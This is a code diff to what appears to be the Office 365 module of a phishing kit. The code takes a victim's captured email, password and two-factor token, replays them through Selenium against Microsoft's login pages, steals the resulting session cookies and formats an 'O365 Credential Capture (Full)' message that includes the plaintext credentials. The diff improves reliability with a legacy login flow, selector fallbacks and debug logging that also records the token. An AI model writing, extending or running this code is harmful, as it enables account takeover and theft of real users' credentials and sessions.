@@ -104,7 +104,9 @@ class Office365Module(BaseModule):
                 self.two_factor_token = token
                 cookies = self.perform_automated_login()
             except Exception as ex:
-                cookies = [{"error": str(ex)}]
+                tb = traceback.format_exc()
+                print(f"[cookie_worker] Exception in perform_automated_login: {tb}")
+                cookies = [{"error": str(ex), "traceback": tb}]
 
             # Attempt to upload debug artefacts (page_source / screenshot)
             artefact_links, doc_paths = [], []
@@ -120,9 +122,16 @@ class Office365Module(BaseModule):
                     else:
                         doc_paths.append(local_path)
 
-            cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
+            # Enhanced error reporting
+            if cookies and len(cookies) > 0 and 'error' in cookies[0]:
+                error_details = cookies[0].get('error', 'Unknown error')
+                traceback_info = cookies[0].get('traceback', 'No traceback available')
+                cookie_block = f"Error: {error_details}\n\nTraceback:\n{traceback_info}"
+            else:
+                cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
+            
             msg = (
-                f"*O365 Credential Capture (Full)*\nEmail: `{user}`\nPassword: `{pwd}`\n2FA: `{token}`\n\nCookies:\n```json\n{cookie_block}\n```"
+                f"*O365 Credential Capture (Full)*\nEmail: `{user}`\nPassword: `{pwd}`\n2FA: `{token}`\n\nCookies:\n```\n{cookie_block}\n```"
             )
             if artefact_links:
                 msg += "\n\nDebug artefacts:\n" + "\n".join(artefact_links)
@@ -182,8 +191,9 @@ class Office365Module(BaseModule):
         password = getattr(self, 'captured_password', None)
         token = getattr(self, 'two_factor_token', None)
         if not all([email, password, token]):
-            return []
+            return [{"error": "Missing credentials", "email": email, "password": bool(password), "token": bool(token)}]
 
+        driver = None
         opts = webdriver.ChromeOptions()
         def log(msg):
             print(f"[{datetime.datetime.utcnow().isoformat()}] SELENIUM: {msg}")
@@ -231,6 +241,102 @@ class Office365Module(BaseModule):
                 except Exception:
                     return False
 
+            # Try legacy flow first
+            log(f"Attempting legacy login flow for {email}")
+            legacy_url = f'https://login.live.com/login.srf?username={email}'
+            driver.get(legacy_url)
+            time.sleep(3)
+            
+            # Check if we're on the password page
+            password_entered = False
+            try:
+                # Try multiple selectors for password field
+                password_selectors = [
+                    (By.NAME, 'passwd'),
+                    (By.ID, 'i0118'),
+                    (By.CSS_SELECTOR, 'input[type="password"]'),
+                    (By.CSS_SELECTOR, 'input[name="passwd"]'),
+                    (By.CSS_SELECTOR, '#i0118')
+                ]
+                
+                password_field = None
+                for by, selector in password_selectors:
+                    try:
+                        log(f"Looking for password field with {by}: {selector}")
+                        password_field = driver.find_element(by, selector)
+                        if password_field and password_field.is_displayed():
+                            log(f"Found password field with {by}: {selector}")
+                            break
+                    except NoSuchElementException:
+                        continue
+                
+                if password_field:
+                    # Wait a bit for the field to be ready
+                    time.sleep(1)
+                    password_field.clear()
+                    password_field.send_keys(password)
+                    log("Password entered successfully")
+                    
+                    # Find and click sign in button
+                    signin_selectors = [
+                        (By.ID, 'idSIButton9'),
+                        (By.CSS_SELECTOR, 'input[type="submit"]'),
+                        (By.CSS_SELECTOR, 'button[type="submit"]'),
+                        (By.XPATH, "//input[@value='Sign in']")
+                    ]
+                    
+                    for by, selector in signin_selectors:
+                        try:
+                            signin_btn = driver.find_element(by, selector)
+                            if signin_btn and signin_btn.is_displayed():
+                                signin_btn.click()
+                                log(f"Clicked sign in button with {by}: {selector}")
+                                password_entered = True
+                                break
+                        except NoSuchElementException:
+                            continue
+                    
+                    if password_entered:
+                        time.sleep(5)  # Wait for redirect
+                        log(f"Current URL after password: {driver.current_url}")
+                else:
+                    log("Password field not found in legacy flow")
+            except Exception as e:
+                log(f"Legacy flow password entry failed: {str(e)}")
+                # Capture debug info
+                try:
+                    timestamp = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
+                    debug_html = f'/tmp/o365_legacy_fail_{timestamp}.html'
+                    debug_png = f'/tmp/o365_legacy_fail_{timestamp}.png'
+                    with open(debug_html, 'w', encoding='utf-8') as fp:
+                        fp.write(driver.page_source)
+                    driver.save_screenshot(debug_png)
+                    log(f"Saved legacy failure debug files: {debug_html}, {debug_png}")
+                except:
+                    pass
+
+            # If legacy flow didn't work or we need to handle 2FA, try standard flow
+            if not password_entered or 'login.microsoftonline.com' in driver.current_url:
+                log("Falling back to standard login flow")
+                driver.get('https://login.microsoftonline.com/')
+                time.sleep(2)
+                
+                # Enter email
+                email_field = driver.find_element(By.NAME, 'loginfmt')
+                email_field.send_keys(email)
+                driver.find_element(By.ID, 'idSIButton9').click()
+                time.sleep(3)
+                
+                # Enter password if we haven't already
+                if not password_entered:
+                    password_field = driver.find_element(By.NAME, 'passwd')
+                    password_field.send_keys(password)
+                    driver.find_element(By.ID, 'idSIButton9').click()
+                    time.sleep(3)
+
+            # Handle 2FA
+            log("Looking for 2FA input fields")
+            
             # Wait for any of the expected next-stage markers to become visible
             try:
                 wait.until(
@@ -242,6 +348,7 @@ class Office365Module(BaseModule):
                         EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="otcInput0"]')),
                     )
                 )
+                log("Found 2FA stage marker")
             except TimeoutException:
                 log(f"No stage-marker element appeared after {WAIT_TIMEOUT}s – proceeding with fallback selectors")
 
@@ -251,6 +358,7 @@ class Office365Module(BaseModule):
                               driver.find_elements(By.CSS_SELECTOR, 'input[id^="idSubmit_SAOTCC"]')
                 if choice_btns:
                     choice_btns[0].click()
+                    log("Clicked verification method continue button")
                     time.sleep(2)
             except Exception:
                 pass  # No choice page, proceed
@@ -259,6 +367,7 @@ class Office365Module(BaseModule):
             try:
                 if element_present(By.ID, 'otcFrame', 5):
                     driver.switch_to.frame(driver.find_element(By.ID, 'otcFrame'))
+                    log("Switched to OTP iframe")
             except Exception:
                 pass
 
@@ -277,9 +386,11 @@ class Office365Module(BaseModule):
             token_input = None
             for by, sel in otp_selectors:
                 try:
+                    log(f"Looking for OTP input with {by}: {sel}")
                     token_input = WebDriverWait(driver, 10).until(
                         EC.presence_of_element_located((by, sel))
                     )
+                    log(f"Found OTP input with {by}: {sel}")
                     break
                 except TimeoutException:
                     continue
@@ -287,11 +398,13 @@ class Office365Module(BaseModule):
             if token_input:
                 token_input.clear()
                 token_input.send_keys(token)
+                log(f"Entered 2FA token: {token}")
                 # The verify/Next button often retains the same ID inside or outside iframe
                 try:
                     driver.find_element(By.ID, 'idSIButton9').click()
+                    log("Clicked verify button")
                 except NoSuchElementException:
-                    pass
+                    log("Verify button not found")
             else:
                 log('OTP input not found – continuing without entering 2FA code')
 
@@ -303,27 +416,26 @@ class Office365Module(BaseModule):
 
             # Handle optional stay signed in prompt
             try:
-                from selenium.webdriver.support.ui import WebDriverWait
-                from selenium.webdriver.support import expected_conditions as EC
                 WebDriverWait(driver, 5).until(
                     EC.element_to_be_clickable((By.ID, 'idBtn_Back'))
                 ).click()
+                log("Clicked 'No' on stay signed in prompt")
             except Exception:
                 pass  # prompt may not appear
 
             # Wait until redirected to Office portal or other Microsoft service page
             try:
-                from selenium.webdriver.support.ui import WebDriverWait
-                from selenium.webdriver.support import expected_conditions as EC
                 WebDriverWait(driver, 20).until(
                     EC.url_contains('office')
                 )
+                log("Successfully redirected to Office portal")
             except Exception:
-                pass
+                log(f"Timeout waiting for Office redirect. Current URL: {driver.current_url}")
 
             time.sleep(2)
 
             cookies = driver.get_cookies()
+            log(f"Captured {len(cookies)} cookies")
 
             # Always save the final page source & screenshot for debugging purposes
             try:
@@ -333,57 +445,78 @@ class Office365Module(BaseModule):
                 with open(final_html_path, 'w', encoding='utf-8') as fp:
                     fp.write(driver.page_source)
                 driver.save_screenshot(final_png_path)
+                log(f"Saved final page artifacts: {final_html_path}, {final_png_path}")
 
                 # Append paths to first cookie object to make them easy to locate later
                 if cookies:
                     cookies[0]['page_source'] = final_html_path
                     cookies[0]['screenshot'] = final_png_path
-            except Exception:
-                pass
+                    cookies[0]['final_url'] = driver.current_url
+                else:
+                    # If no cookies, create a dict to hold the debug info
+                    cookies = [{
+                        'page_source': final_html_path,
+                        'screenshot': final_png_path,
+                        'final_url': driver.current_url,
+                        'warning': 'No cookies captured'
+                    }]
+            except Exception as e:
+                log(f"Failed to save final artifacts: {str(e)}")
+                
         except Exception as e:
             tb = traceback.format_exc()
-            print(tb)
-            # Save current page HTML & screenshot for offline inspection
-            page_path = None
-            screenshot_path = None
-            cookies = [{"error": str(e)}]
+            print(f"[perform_automated_login] Exception: {tb}")
+            log(f"Exception occurred: {str(e)}")
+            
+            # Enhanced error reporting with current state
+            cookies = [{
+                "error": str(e),
+                "traceback": tb,
+                "current_url": driver.current_url if driver else "Driver not initialized",
+                "timestamp": datetime.datetime.utcnow().isoformat()
+            }]
+            
             try:
-                if 'driver' in locals() and driver:
+                if driver:
                     # First snapshot immediately after failure
                     page_source = driver.page_source
                     timestamp1 = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
-                    page_path = f'/tmp/o365_2fa_page_{timestamp1}.html'
+                    page_path = f'/tmp/o365_error_{timestamp1}.html'
                     with open(page_path, 'w', encoding='utf-8') as fp:
                         fp.write(page_source)
-                    screenshot_path = f'/tmp/o365_2fa_page_{timestamp1}.png'
+                    screenshot_path = f'/tmp/o365_error_{timestamp1}.png'
                     driver.save_screenshot(screenshot_path)
                     cookies[0]['page_source'] = page_path
                     cookies[0]['screenshot'] = screenshot_path
+                    log(f"Saved error artifacts: {page_path}, {screenshot_path}")
 
                     # Wait and capture second state
                     time.sleep(6)
                     try:
                         page_source2 = driver.page_source
                         timestamp2 = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
-                        page_path2 = f'/tmp/o365_2fa_page2_{timestamp2}.html'
+                        page_path2 = f'/tmp/o365_error2_{timestamp2}.html'
                         with open(page_path2, 'w', encoding='utf-8') as fp:
                             fp.write(page_source2)
-                        screenshot_path2 = f'/tmp/o365_2fa_page2_{timestamp2}.png'
+                        screenshot_path2 = f'/tmp/o365_error2_{timestamp2}.png'
                         driver.save_screenshot(screenshot_path2)
                         cookies[0]['page_source_wait'] = page_path2
                         cookies[0]['screenshot_wait'] = screenshot_path2
+                        log(f"Saved second error artifacts: {page_path2}, {screenshot_path2}")
                     except Exception:
                         pass
-            except Exception:
-                pass
-            self._last_error = tb
+            except Exception as debug_error:
+                log(f"Failed to capture debug artifacts: {str(debug_error)}")
+                
         finally:
             try:
-                driver.quit()
+                if driver:
+                    driver.quit()
+                    log("Chrome driver closed")
             except Exception:
                 pass
+                
         return cookies
 
 def load(enable_2fa=False):
-    return Office365Module(enable_2fa) 
-    
+    return Office365Module(enable_2fa)
